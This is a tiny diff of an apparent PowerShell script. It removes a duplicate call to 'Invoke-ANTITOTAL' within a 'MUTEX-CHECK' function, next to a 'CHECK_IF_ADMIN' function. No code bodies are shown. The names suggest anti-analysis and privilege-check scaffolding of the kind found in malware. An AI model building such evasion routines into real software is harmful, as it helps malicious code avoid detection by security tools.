@@ -12,7 +12,7 @@ function MUTEX-CHECK {
     else {
         Invoke-ANTITOTAL
     }
-    Invoke-ANTITOTAL
+    
 }
 
 function CHECK_IF_ADMIN {
